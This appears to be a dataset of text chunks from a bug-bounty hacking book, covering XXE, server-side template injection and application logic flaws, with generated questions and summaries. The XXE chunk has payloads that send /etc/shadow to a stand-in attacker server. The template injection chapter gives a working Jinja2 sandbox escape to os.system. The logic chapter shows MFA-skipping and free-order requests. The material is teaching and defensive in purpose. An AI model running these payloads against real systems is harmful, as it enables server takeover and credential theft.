desired data into base64 format so you can use it to read XML files\nor even binary files:\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/shadow\">\n<!ENTITY % ent \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>\">\n%ent;\n%exfiltrate;\nXML External Entity 259\nThe File Transfer Protocol (FTP) can also be used to send data directly\nwhile bypassing special character restrictions. HTTP has many special char-\nacter restrictions and typically restricts the length of the URL. Using FTP\ninstead is an easy way to bypass that. To use it, you need to run a simple\nFTP server on your machine and modify your malicious DTD accordingly. I\nused the simple Ruby server script at https://github.com/ONsec-Lab/scripts/blob/\nmaster/xxe-ftp-server.rb:\n<!ENTITY % file SYSTEM \"file:///etc/shadow\">\n<!ENTITY % ent \"<!ENTITY &#x25; exfiltrate SYSTEM\n1 'ftp://attacker_server:2121/?%file;'>\">\n%ent;\n%exfiltrate;\nWe are using port 2121 here because the Ruby FTP server we are using\nruns on port 2121, but the correct port to use depends on how you run your\nserver 1.\nFinding Your First XXE!\nNow that you understand the basics of the XXE attack, try to find your own\nXXE vulnerability on a real target. Follow the steps covered in this chapter\nto maximize your chances of success:\n1. Find data entry points that you can use to submit XML data.\n2. Determine whether the entry point is a candidate for a classic or blind\nXXE. The endpoint might be vulnerable to classic XXE if it returns\nthe parsed XML data in the HTTP response. If the endpoint does not\nreturn results, it might still be vulnerable to blind XXE, and you should\nset up a callback listener for your tests.\n3. Try out a few test payloads to see if the parser is improperly configured.\nIn the case of classic XXEs, you can check whether the parser is pro-\ncessing external entities. In the case of blind XXEs, you can make the\nserver send requests to your callback listener to see if you can trigger\noutbound interaction.\n4. If the XML parser has the functionalities that make it vulnerable to\nXXE attacks, try to exfiltrate a common system file, like /etc/hostname.\n5. You can also try to retrieve some more sensitive system files, like\n/etc/shadow or ~/.bash_history.\n6. If you cannot exfiltrate the entire file with a simple XXE payload, try to\nuse an alternative data exfiltration method.\n7. See if you can launch an SSRF attack using the XXE.\n8. Draft up your very first XXE report and send it over to the company!\n260 Chapter 15",
    "question": "What is an XML External Entity (XXE) attack and how can it be used to exploit vulnerabilities in web applications?",
    "summary": "XML external entity (XXE) attacks exploit weaknesses in XML parsers to disclose sensitive information, perform SSRF attacks, or cause DoS. These attacks involve defining external entities in XML documents that can access local or remote resources. To prevent XXEs, disable DTD processing, restrict external entity access, and validate input. To detect XXEs, look for XML input points, test with payloads to read files or trigger outbound requests, and use techniques like blind XXEs or XInclude attacks. XXEs can be used to exfiltrate data, launch SSRF, or cause denial of service by overloading the parser."
  },
  {
    "start": 179,
    "end": 188,
    "text": "16\nTEMPL ATE INJECTION\nTemplate engines are a type of software used\nto determine the appearance of a web page.\nDevelopers often overlook attacks that target\nthese engines, called server-side template injec-\ntions (SSTIs), yet they can lead to severe consequences,\nlike remote code execution. They have become more\ncommon in the past few years, with instances found\nin the applications of organizations such as Uber and\nShopify.\nIn this chapter, we’ll dive into the mechanisms of this vulnerability by\nfocusing on web applications using the Jinja2 template engine. After con-\nfirming that we can submit template injections to the application, we’ll take\nadvantage of Python sandbox-escaping tricks to run operating system com-\nmands on the server.\nExploiting various template engines will require different syntax and\nmethods, but this chapter should give you a good introduction to the prin-\nciples useful for finding and exploiting template injection vulnerabilities on\nany system.\nMechanisms\nTo understand how template injections work, you need to understand the\nmechanisms of the template engines they target. Simply put, template engines\ncombine application data with web templates to produce web pages. These\nweb templates, written in template languages such as Jinja, provide developers\nwith a way to specify how a page should be rendered. Together, web templates\nand template engines allow developers to separate server-side application logic\nand client-side presentation code during web development.\nTemplate Engines\nLet’s take a look at Jinja, a template language for Python. Here is a template\nfile written in Jinja. We will store this file with the name example.jinja:\n<html>\n<body>\n1 <h1>{{ list_title }}</h1>\n<h2>{{ list_description }}</h2>\n2 {% for item in item_list %}\n{{ item }}\n{% if not loop.last %},{% endif %}\n{% endfor %}\n</body>\n</html>\nAs you can see, this template file looks like normal HTML. However, it\ncontains special syntax to indicate content that the template engine should\ninterpret as template code. In Jinja, any code surrounded by double curly\nbrackets {{ }} is to be interpreted as a Python expression, and code sur-\nrounded by bracket and percent sign pairings {% %} should be interpreted\nas a Python statement.\nIn programming languages, an expression is either a variable or a func-\ntion that returns a value, whereas a statement is code that doesn’t return\nanything. Here, you can see that the template first embeds the expressions\nlist_title and list_description in HTML header tags 1. Then it creates a\nloop to render all items in the item_list variable in the HTML body 2.\nNow the developer can combine the template with Python code to cre-\nate the complete HTML page. The following piece of Python code reads the\ntemplate file from example.jinja and generates an HTML page dynamically by\nproviding the template engine with values to insert into the template:\nfrom jinja2 import Template\nwith open('example.jinja') as f: 1\ntmpl = Template(f.read())\n262 Chapter 16\nprint(tmpl.render( 2\nlist_title = 3 \"Chapter Contents\",\nlist_description = 4 \"Here are the contents of chapter 16.\",\nitem_list = 5 [\"Mechanisms Of Template Injection\", \"Preventing Template Injection\",\n\"Hunting For Template Injection\", \\\n\"Escalating Template Injection\", \"Automating Template Injection\", \"Find Your First Template\nInjection!\"]\n))\nFirst, the Python code reads the template file named example.jinja 1. It\nthen generates an HTML page dynamically by providing the template with\nthe values it needs 2. You can see that the code is rendering the template\nwith the values Chapter Contents as the list_title 3, and Here are the contents\nof chapter 16. as the list_description 4, and a list of values—Mechanisms Of\nTemplate Injection, Preventing Template Injection, Hunting For Template Injection,\nEscalating Template Injection, Automating Template Injection, and Find Your First\nTemplate Injection!—as the item_list 5.\nThe template engine will combine the data provided in the Python script\nand the template file example.jinja to create this HTML page:\n<html>\n<body>\n<h1>Chapter Contents</h1>\n<h2>Here are the contents of chapter 16.</h2>\nMechanisms Of Template Injection,\nPreventing Template Injection,\nHunting For Template Injection,\nEscalating Template Injection,\nAutomating Template Injection,\nFind Your First Template Injection!\n</body>\n</html>\nTemplate engines make rendering web pages more efficient, as devel-\nopers can present different sets of data in a standardized way by reusing\ntemplates. This functionality is especially useful when developers need to\ngenerate pages of the same format with custom content, such as bulk emails,\nindividual item pages on an online marketplace, and the profile pages of\ndifferent users. Separating HTML code and application logic also makes it\neasier for developers to modify and maintain parts of the HTML code.\nPopular template engines on the market include Jinja, Django, and\nMako (which work with Python), Smarty and Twig (which work with PHP),\nand Apache FreeMarker and Apache Velocity (which work with Java). We’ll\ntalk more about how to identify these template engines in applications later\nin this chapter.\nInjecting Template Code\nTemplate injection vulnerabilities happen when a user is able to inject input\ninto templates without proper sanitization. Our previous example isn’t\nvulnerable to template injection vulnerabilities because it does not embed\nTemplate Injection 263\nuser input into templates. It simply passes a list of hardcoded values as the\nlist_title, list_description, and item_list into the template. Even if the pre-\nceding Python snippet does pass user input into the template like this, the\ncode would not be vulnerable to template injection because it is safely pass-\ning user input into the template as data:\nfrom jinja2 import Template\nwith open('example.jinja') as f:\ntmpl = Template(f.read())\nprint(tmpl.render(\n1 list_title = user_input.title,\n2 list_description = user_input.description,\n3 item_list = user_input.list,\n))\nAs you can see, the code is clearly defining that the title portion of the\nuser_input can be used only as the list_title 1, the description portion of\nthe user_input is the list_description 2, and the list portion of the user_input\ncan be used for the item_list of the template 3.\nHowever, sometimes developers treat templates like strings in program-\nming languages and directly concatenate user input into them. This is\nwhere things go wrong, as the template engine won’t be able to distinguish\nbetween user input and the developer’s template code.\nHere’s an example. The following program takes user input and inserts\nit into a Jinja template to display the user’s name on an HTML page:\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")1 print(tmpl.render())2\nThe code first creates a template by concatenating HTML code and\nuser input together 1, then renders the template 2.\nIf users submit a GET request to that page, the website will return an\nHTML page that displays their name:\nGET /display_name?name=Vickie\nHost: example.com\nThis request will cause the template engine to render the following page:\n<html>\n<h1>The user's name is: Vickie</h1>\n</html>\nNow, what if you submitted a payload like the following instead?\nGET /display_name?name={{1+1}}\nHost: example.com\nInstead of supplying a name as the name parameter, you are submitting\nan expression that has special meaning for the template engine. Jinja2\n264 Chapter 16\ninterprets anything within double curly brackets {{ }} as Python code. You\nwill notice something odd in the resulting HTML page. Instead of display-\ning the string The user's name is: {{1+1}}, the page displays the string The\nuser's name is: 2:\n<html>\n<h1>The user's name is: 2</h1>\n</html>\nWhat just happened? When you submitted {{1+1}} as your name, the\ntemplate engine mistook the content enclosed in {{ }} as a Python expres-\nsion, so it executed 1+1 and returned the number 2 in that field.\nThis means you can submit any Python code you’d like and get its\nresults returned in the HTML page. For instance, upper() is a method in\nPython that converts a string to uppercase. Try submitting the code snippet\n{{'Vickie'.upper()}}, like this:\nGET /display_name?name={{'Vickie'.upper()}}\nHost: example.com\nYou should see an HTML page like this returned:\n<html>\n<h1>The user's name is: VICKIE</h1>\n</html>\nYou may have noticed that template injections are similar to SQL injec-\ntions. If the template engine can’t determine where a piece of user-supplied\ndata ends and where the template logic starts, the template engine will mis-\ntake user input for template code. In those cases, attackers can submit arbi-\ntrary code and get the template engine to execute their input as source code!\nDepending on the permissions of the compromised application, attack-\ners might be able to use the template injection vulnerability to read sensitive\nfiles or escalate their privileges on the system. We will talk more about esca-\nlating template injections later in this chapter.\nPrevention\nHow can you prevent this dangerous vulnerability? The first way is by regu-\nlarly patching and updating the frameworks and template libraries your\napplication uses. Many developers and security professionals are catching\non to the danger of template injections. As a result, template engines pub-\nlish various mitigations against this attack. Constantly updating your soft-\nware to the newest version will ensure that your applications are protected\nagainst new attack vectors.\nYou should also prevent users from supplying user-submitted templates\nif possible. If that isn’t an option, many template engines provide a hard-\nened sandbox environment that you can use to safely handle user input.\nThese sandbox environments remove potentially dangerous modules and\nTemplate Injection 265\nfunctions, making user-submitted templates safer to evaluate. However,\nresearchers have published numerous sandbox escape exploits, so this is\nby no means a bulletproof method. Sandbox environments are also only as\nsafe as their configurations.\nImplement an allowlist for allowed attributes in templates to prevent\nthe kind of RCE exploit that I’ll introduce in this chapter. Also, some-\ntimes template engines raise descriptive errors that help attackers develop\nexploits. You should handle these errors properly and return a generic\nerror page to the user. Finally, sanitize user input before embedding it\ninto web templates and avoid injecting user-supplied data into templates\nwhenever possible.\nHunting for Template Injection\nAs with hunting for many other vulnerabilities, the first step in finding tem-\nplate injections is to identify locations in an application that accept user input.\nStep 1: Look for User-Input Locations\nLook for locations where you can submit user input to the application.\nThese include URL paths, parameters, fragments, HTTP request headers\nand body, file uploads, and more.\nTemplates are typically used to dynamically generate web pages from\nstored data or user input. For example, applications often use template\nengines to generate customized email or home pages based on the user’s\ninformation. So to look for template injections, look for endpoints that\naccept user input that will eventually be displayed back to the user. Since\nthese endpoints typically coincide with the endpoints for possible XXS\nattacks, you can use the strategy outlined in Chapter 6 to identify candi-\ndates for template injection. Document these input locations for further\ntesting.\nStep 2: Detect Template Injection by Submitting Test Payloads\nNext, detect template injection vulnerabilities by injecting a test string into\nthe input fields you identified in the previous step. This test string should\ncontain special characters commonly used in template languages. I like to\nuse the string {{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx] because it’s designed\nto induce errors in popular template engines. ${...} is the special syntax for\nexpressions in the FreeMarker and Thymeleaf Java templates; {{...}} is the\nsyntax for expressions in PHP templates such as Smarty or Twig, and Python\ntemplates like Jinja2; and <%= ... %> is the syntax for the Embedded Ruby\ntemplate (ERB). And [random expression] will make the server interpret the\nrandom expression as a list item if the user input is placed into an expression\ntag within the template (we will discuss an example of this scenario later).\nIn this payload, I make the template engine resolve the variable with\nthe name abcxx, which probably has not been defined in the application. If\nyou get an application error from this payload, that’s a good indication of\n266 Chapter 16\ntemplate injection, because it means that the special characters are being\ntreated as special by the template engine. But if error messages are sup-\npressed on the server, you need to use another method to detect template\ninjection vulnerabilities.\nTry providing these test payloads to the input fields ${7*7}, {{7*7}}, and\n<%= 7*7 %>. These payloads are designed to detect template injection in vari-\nous templating languages. ${7*7} works for the FreeMarker and Thymeleaf\nJava templates; {{7*7}} works for PHP templates such as Smarty or Twig, and\nPython templates like Jinja2; and <%= 7*7 %> works for the ERB template.\nIf any of the returned responses contain the result of the expression, 49, it\nmeans that the data is being interpreted as code by the template engine:\nGET /display_name?name={{7*7}}\nHost: example.com\nWhile testing these endpoints for template injections, keep in mind\nthat successful payloads don’t always cause results to return immediately.\nSome applications might insert your payload into a template somewhere\nelse. The results of your injection could show up in future web pages,\nemails, and files. A time delay also might occur between when the payload\nis submitted and when the user input is rendered in a template. If you’re\ntargeting one of these endpoints, you’ll need to look out for signs that your\npayload has succeeded. For example, if an application renders an input field\nunsafely when generating a bulk email, you will need to look at the gener-\nated email to check whether your attack has succeeded.\nThe three test payloads ${7*7}, {{7*7}}, and <%= 7*7 %> would work when\nuser input is inserted into the template as plaintext, as in this code snippet:\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")print(tmpl.render())\nBut what if the user input is concatenated into the template as a part of\nthe template’s logic, as in this code snippet?\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: {{\" + user_input + \"}}</h1></html>\")print(tmpl.render())\nHere, the user input is placed into the template within expression tags\n{{...}}. Therefore, you do not have to provide extra expression tags for the\nserver to interpret the input as code. In that case, the best way to detect\nwhether your input is being interpreted as code is to submit a random\nexpression and see if it gets interpreted as an expression. In this case,\nyou can input 7*7 to the field and see if 49 gets returned:\nGET /display_name?name=7*7\nHost: example.com\nTemplate Injection 267\nStep 3: Determine the Template Engine in Use\nOnce you’ve confirmed the template injection vulnerability, determine the\ntemplate engine in use to figure out how to best exploit that vulnerability.\nTo escalate your attack, you’ll have to write your payload with a program-\nming language that the particular template engine expects.\nIf your payload caused an error, the error message itself may contain\nthe name of the template engine. For example, submitting my test string\n{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx] to our example Python application\nwould cause a descriptive error that tells me that the application is using\nJinja2:\njinja2.exceptions.UndefinedError: 'abcxx' is undefined\nOtherwise, you can figure out the template engine in use by submitting\ntest payloads specific to popular template languages. For example, if you\nsubmit <%= 7*7 %> as the payload and 49 gets returned, the application prob-\nably uses the ERB template. If the successful payload is ${7*7}, the template\nengine could either be Smarty or Mako. If the successful payload is {{7*7}},\nthe application is likely using Jinja2 or Twig. At that point, you could submit\nanother payload, {{7*'7'}}, which would return 7777777 in Jinja2 and 49 in\nTwig. These testing payloads are taken from PortSwigger research: https://\nportswigger.net/research/server-side-template-injection/.\nMany other template engines are used by web applications besides the\nones I’ve talked about. Many have similar special characters designed not\nto interfere with normal HTML syntax, so you might need to perform mul-\ntiple test payloads to definitively determine the type of template engine you\nare attacking.\nEscalating the Attack\nOnce you’ve determined the template engine in use, you can start to esca-\nlate the vulnerability you’ve found. Most of the time, you can simply use\nthe 7*7 payload introduced in the preceding section to prove the tem-\nplate injection to the security team. But if you can show that the template\ninjection can be used to accomplish more than simple mathematics, you\ncan prove the impact of your bug and show the security team its value.\nYour method of escalating the attack will depend on the template engine\nyou’re targeting. To learn more about it, read the official documentation of\nthe template engine and the accompanying programming language. Here,\nI’ll show how you can escalate a template injection vulnerability to achieve\nsystem command execution in an application running Jinja2.\nBeing able to execute system commands is extremely valuable for the\nattacker because it might allow them to read sensitive system files like cus-\ntomer data and source code files, update system configurations, escalate\ntheir privileges on the system, and attack other machines on the network.\nFor example, if an attacker can execute arbitrary system commands on a\nLinux machine, they can read the system’s password file by executing the\n268 Chapter 16\ncommand cat /etc/shadow. They can then use a password-cracking tool\nto crack the system admin’s encrypted password and gain access to the\nadmin’s account.\nSearching for System Access via Python Code\nLet’s circle back to our example application. We already know that you can\nexecute Python code by using this template injection vulnerability. But how\ndo you go on to execute system commands by injecting Python code?\nfrom jinja2 import Template\ntmpl = Template(\"\n<html><h1>The user's name is: \" + user_input + \"</h1></html>\")print(tmpl.render())\nNormally in Python, you can execute system commands via the os.system()\nfunction from the os module. For example, this line of Python code would\nexecute the Linux system command ls to display the contents of the current\ndirectory:\nos.system('ls')\nHowever, if you submit this payload to our example application, you\nmost likely won’t get the results you expect:\nGET /display_name?name={{os.system('ls')}}\nHost: example.com\nInstead, you’ll probably run into an application error:\njinja2.exceptions.UndefinedError: 'os' is undefined\nThis is because the os module isn’t recognized in the template’s environ-\nment. By default, it doesn’t contain dangerous modules like os. Normally,\nyou can import Python modules by using the syntax import MODULE, or from\nMODULE import *, or finally __import__('MODULE'). Let’s try to import the os\nmodule:\nGET /display_name?name=\"{{__import__('os').system('ls')}}\"\nHost: example.com\nIf you submit this payload to the application, you will probably see\nanother error returned:\njinja2.exceptions.UndefinedError: '__import__' is undefined\nThis is because you can’t import modules within Jinja templates. Most\ntemplate engines will block the use of dangerous functionality such as import\nor make an allowlist that allows users to perform only certain operations\nwithin the template. To escape these limitations of Jinja2, you need to take\nadvantage of Python sandbox-escape techniques.\nTemplate Injection 269\nEscaping the Sandbox by Using Python Built-in Functions\nOne of these techniques involves using Python’s built-in functions. When\nyou’re barred from importing certain useful modules or importing any-\nthing at all, you need to investigate functions that are already imported by\nPython by default. Many of these built-in functions are integrated as a part\nof Python’s object class, meaning that when we want to call these functions,\nwe can create an object and call the function as a method of that object.\nFor example, the following GET request contains Python code that lists the\nPython classes available:\nGET /display_name?name=\"{{[].__class__.__bases__[0].__subclasses__()}}\"\nHost: example.com\nWhen you submit this payload into the template injection endpoint, you\nshould see a list of classes like this:\n[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class\n'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class\n'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class\n'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_\nkeys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reverse\nkeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitem\niterator'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class\n'slice'>, <class 'staticmethod'>, <class 'complex'>, <class 'float'>, <class\n'frozenset'>, <class 'property'>, <class 'managedbuffer'>, <class 'memory\nview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class\n'stderrprinter'>, <class 'code'>, <class 'frame'>, <class 'builtin_function_\nor_method'>, <class 'method'>, <class 'function'>...]\nTo better understand what’s happening here, let’s break down this pay-\nload a bit:\n[].__class__.__bases__[0].__subclasses__()\nIt first creates an empty list and calls its __class__ attribute, which refers\nto the class the instance belongs to, list:\n[].__class__\nThen you can use the __bases__ attribute to refer to the base classes of\nthe list class:\n[].__class__.__bases__\nThis attribute will return a tuple (which is just an ordered list in Python)\nof all the base classes of the class list. A base class is a class that the current\nclass is built from; list has a base class called object. Next, we need to access\nthe object class by referring to the first item in the tuple:\n[].__class__.__bases__[0]\n270 Chapter 16\nFinally, we use __subclasses__() to refer to all the subclasses of the class:\n[].__class__.__bases__[0].__subclasses__()\nWhen we use this method, all the subclasses of the object class become\naccessible to us! Now, we simply need to look for a method in one of these\nclasses that we can use for command execution. Let’s explore one possible\nway of executing code. Before we go on, keep in mind that not every appli-\ncation’s Python environment will have the same classes. Moreover, the pay-\nload I’ll talk about next may not work on all target applications.\nThe __import__ function, which can be used to import modules, is one of\nPython’s built-in functions. But since Jinja2 is blocking its direct access, you\nwill need to access it via the builtins module. This module provides direct\naccess to all of Python’s built-in classes and functions. Most Python modules\nhave __builtins__ as an attribute that refers to the built-in module, so you can\nrecover the builtins module by referring to the __builtins__ attribute.\nWithin all the subclasses in [].__class__.__bases__[0].__subclasses__(),\nthere is a class named catch_warnings. This is the subclass we’ll use to con-\nstruct our exploit. To find the catch_warnings subclass, inject a loop into the\ntemplate code to look for it:\n1 {% for x in [].__class__.__bases__[0].__subclasses__() %}\n2 {% if 'catch_warnings' in x.__name__ %}\n3 {{x()}}\n{%endif%}\n{%endfor%}\nThis loop goes through all the classes in [].__class__.__bases__[0]\n.__subclasses__() 1 and finds the one with the string catch_warnings in its\nname 2. Then it instantiates an object of that class 3. Objects of the class\ncatch_warnings have an attribute called _module that refers to the warnings\nmodule.\nFinally, we use the reference to the module to refer to the builtins\nmodule:\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__}}\n{%endif%}\n{%endfor%}\nYou should see a list of built-in classes and functions returned, includ-\ning the function __import__:\n{'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\\nnNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.\", '__package__':\n'', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name=\n'builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in\nfunction __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in\nTemplate Injection 271\nfunction abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii':\n<built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function\nbreakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>,\n'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir':\n<built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function\neval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr':\n<built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in\nfunction hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id':\n<built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function\nisinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>,\n'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function\nmax>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in\nfunction oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print':\n<built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function\nround>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum':\n<built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis,\n'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>,\n'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>,\n'classmethod': <class 'classmethod'>, ...}\nWe now have a way to access the import functionality! Since the built-\nin classes and functions are stored in a Python dictionary, you can access\nthe __import__ function by referring to the key of the function’s entry in the\ndictionary:\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__['__import__']}}\n{%endif%}\n{%endfor%}\nNow we can use the __import__ function to import the os module. You\ncan import a module with __import__ by providing the name of that mod-\nule as an argument. Here, let’s import the os module so we can access the\nsystem() function:\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__['__import__']('os')}}\n{%endif%}\n{%endfor%}\nFinally, call the system() function and put the command we want to\nexecute as the system() function’s argument:\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'catch_warnings' in x.__name__ %}\n{{x()._module.__builtins__['__import__']('os').system('ls')}}\n{%endif%}\n{%endfor%}\n272 Chapter 16\nYou should see the results of the ls command returned. This command\nlists the contents of the current directory. You’ve achieved command execu-\ntion! Now, you should be able to execute arbitrary system commands with\nthis template injection.\nSubmitting Payloads for Testing\nFor testing purposes, you should execute code that doesn’t harm the system\nyou’re targeting. A common way of proving that you’ve achieved command\nexecution and gained access to the operating system is to create a file with\na distinct filename on the system, such as template_injection_by_YOUR_BUG\n_BOUNTY_USERNAME.txt, so that the file is clearly a part of your proof of\nconcept. Use the touch command to create a file with the specified name in\nthe current directory:\n{% for x in [].__class__.__bases__[0].__subclasses__() %}\n{% if 'warning' in x.__name__ %}\n{{x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie\n.txt')}}\n{%endif%}\n{%endfor%}\nDifferent template engines require different escalation techniques. If\nexploring this interests you, I encourage you to do more research into the\narea. Code execution and sandbox escapes are truly fascinating topics.\nWe will discuss more about how to execute arbitrary code on target sys-\ntems in Chapter 18. If you are interested in learning more about sandbox\nescapes, these articles discuss the topic in more detail (this chapter’s exam-\nple was developed from a tip in Programmer Help):\n• CTF Wiki, https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/\npython-sandbox-escape/\n• HackTricks, https://book.hacktricks.xyz/misc/basic-python/\nbypass-python-sandboxes/\n• Programmer Help, https://programmer.help/blogs/python-sandbox-escape.html\nAutomating Template Injection\nDeveloping exploits for each system you target can be time-consuming.\nLuckily, templates often contain already known exploits that others have\ndiscovered, so when you find a template injection vulnerability, it’s a good\nidea to automate the exploitation process to make your work more efficient.\nOne tool built to automate the template injection process, called\ntplmap (https://github.com/epinna/tplmap/), can scan for template injections,\ndetermine the template engine in use, and construct exploits. While this\ntool does not support every template engine, it should provide you with a\ngood starting point for the most popular ones.\nTemplate Injection 273\nFinding Your First Template Injection!\nIt’s time to find your first template injection vulnerability by following the\nsteps we discussed in this chapter:\n1. Identify any opportunity to submit user input to the application. Mark\ndown candidates of template injection for further inspection.\n2. Detect template injection by submitting test payloads. You can use\neither payloads that are designed to induce errors, or engine-specific\npayloads designed to be evaluated by the template engine.\n3. If you find an endpoint that is vulnerable to template injection, deter-\nmine the template engine in use. This will help you build an exploit\nspecific to the template engine.\n4. Research the template engine and programming language that the\ntarget is using to construct an exploit.\n5. Try to escalate the vulnerability to arbitrary command execution.\n6. Create a proof of concept that does not harm the targeted system. A\ngood way to do this is to execute touch template_injection_by_YOUR_NAME\n.txt to create a specific proof-of-concept file.\n7. Draft your first template injection report and send it to the\norganization!\n274 Chapter 16",
    "question": "",
    "summary": ""
  },
  {
    "start": 189,
    "end": 194,
    "text": "17\nAPPLICATION LOGIC ERRORS\nAND BROKEN ACCESS CONTROL\nApplication logic errors and broken access\ncontrol vulnerabilities are quite different\nfrom those we’ve discussed so far. Most of\nthe vulnerabilities covered in previous chapters\nare caused by faulty input validation: they happen\nwhen polluted user input is processed without proper\nsanitization. These malicious inputs are syntactically\ndifferent from normal user input and are designed to\nmanipulate application logic and cause damage to the\napplication or its users.\nOn the other hand, application logic errors and broken access control\nissues are often triggered by perfectly valid HTTP requests containing no\nillegal or malformed character sequences. Still, these requests are crafted\nintentionally to misuse the application’s logic for malicious purposes or\ncircumvent the application’s access control.\nApplication logic errors are logic flaws in an application. Sometimes\nattackers can exploit them to cause harm to the organization, the applica-\ntion, or its users. Broken access control occurs when sensitive resources or\nfunctionality are not properly protected. To find these vulnerabilities, you\ncannot simply rely on your technical knowledge. Instead, you need to use\nyour creativity and intuition to bypass restrictions set by the developers.\nThis chapter explains these vulnerabilities, how they manifest in applica-\ntions, and how you can test for them.\nApplication Logic Errors\nApplication logic errors, or business logic vulnerabilities, are ways of using the\nlegitimate logic flow of an application that result in a negative consequence\nto the organization. Sound a bit abstract? The best way to understand them\nis to look at a few examples.\nA common application logic error I’ve seen in the websites I’ve targeted\nis a flaw in the site’s multifactor authentication functionality. Multifactor\nauthentication, or MFA, is the practice of requiring users to prove their iden-\ntities in more than one way. MFA protects users in the event of password\ncompromise by requiring them to authenticate with both a password and\nanother proof of identity—typically a phone number or an email account,\nbut sometimes via an authentication app, a physical key, or even fingerprints.\nMost MFA implementations prompt the user to authenticate using both a\npassword and an authorization code delivered via email or text message.\nBut MFA implementations are often compromised by a logic error I\ncall the skippable authentication step, which allows users to forgo a step in the\nauthentication process. For example, let’s say an application implements a\nthree-step login process. First, the application checks the user’s password.\nThen, it sends an MFA code to the user and verifies it. Finally, the applica-\ntion asks a security question before logging in the user:\nStep 1 (Password Check)  Step 2 (MFA)  Step 3 (Security\nQuestions)\nA normal authentication flow would look like this:\n1. The user visits https://example.com/login/. The application prompts the\nuser for their password, and the user enters it.\n2. If the password is correctly entered, the application sends an MFA code\nto the user’s email address and redirects the user to https://example.com/\nmfa/. Here, the user enters the MFA code.\n3. The application checks the MFA code, and if it is correct, redirects the\nuser to https://example.com/security_questions/. There, the application asks\nthe user several security questions and logs in the user if the answers\nthey provided are correct.\nSometimes, though, users can reach step 3 in the authentication process\nwithout clearing steps 1 and 2. While the vulnerable application redirects\nusers to step 3 after the completion of step 2, it doesn’t verify that step 2 is\n276 Chapter 17\ncompleted before users are allowed to advance to step 3. In this case, all the\nattacker has to do is to manipulate the site’s URL and directly request the\npage of a later stage.\nIf attackers can directly access https://example.com/security_questions/, they\ncould bypass the multifactor authentication entirely. They might be able\nto log in with someone’s password and answers to their security questions\nalone, without needing their MFA device.\nAnother time application logic errors tend to manifest is during multi-\nstep checkout processes. Let’s say an online shop allows users to pay via a\nsaved payment method. When users save a new payment method, the site\nwill verify whether the credit card is valid and current. That way, when the\nuser submits an order via a saved payment method, the application won’t\nhave to verify it again.\nSay that the POST request to submit the order with a saved payment\nmethod looks like this, where the payment_id parameter refers to the ID of\nthe user’s saved credit card:\nPOST /new_order\nHost: shop.example.com\n(POST request body)\nitem_id=123\n&quantity=1\n&saved_card=1\n&payment_id=1\nUsers can also pay with a new credit card for each order. If users pay\nwith a new credit card, the card will be verified at the time of checkout. Say\nthe POST request to submit the order with a new payment method looks\nlike this:\nPOST /new_order\nHost: shop.example.com\n(POST request body)\nitem_id=123\n&quantity=1\n&card_number=1234-1234-1234-1234\nTo reiterate, the application will verify the credit card number only\nif the customer is using a new payment method. But the application also\ndetermines whether the payment method is new by the existence of the\nsaved_card parameter in the HTTP request. So a malicious user can submit a\nrequest with a saved_card parameter and a fake credit card number. Because\nof this error in payment verification, they could order unlimited items for\nfree with the unverified card:\nPOST /new_order\nHost: shop.example.com\nApplication Logic Errors and Broken Access Control 277\n(POST request body)\nitem_id=123\n&quantity=1\n&saved_card=1\n&card_number=0000-0000-0000-0000\nApplication logic errors like these are prevalent because these flaws\ncannot be scanned for automatically. They can manifest in too many ways,\nand most current vulnerability scanners don’t have the intelligence to\nunderstand application logic or business 